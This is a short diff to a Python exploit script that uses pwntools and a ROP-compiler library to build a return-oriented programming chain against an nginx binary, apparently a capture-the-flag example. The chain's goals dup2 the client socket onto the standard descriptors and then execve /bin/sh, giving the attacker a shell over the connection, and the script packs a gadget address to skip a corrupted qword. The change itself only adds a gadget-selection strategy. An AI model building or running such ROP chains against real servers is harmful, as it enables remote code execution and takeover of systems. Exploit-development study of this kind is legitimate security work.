@@ -1,6 +1,6 @@
 import sys, logging, struct
 from pwn import *
-from rop_compiler import ropme, goal
+from rop_compiler import ropme, goal, gadget
 
 files = [('./example/bkp/blah/nginx', './example/bkp/blah/nginx.gadgets', 0)] # Use stored gadgets file for quicker generation
 goals = [
@@ -9,7 +9,7 @@ goals = [
   ["function", "dup2", 7, 2], # socket fd 7 = client socket
   ["execve", "/bin/sh"]
 ]
-rop = ropme.rop(files, [], goals, log_level = logging.DEBUG)
+rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, strategy = gadget.FIRST)
 
 # The exploit causes the 3rd overwritten qword to get corrupted, skip past it
 skip_24_bytes_gadget = struct.pack("Q", 0x4035b2)
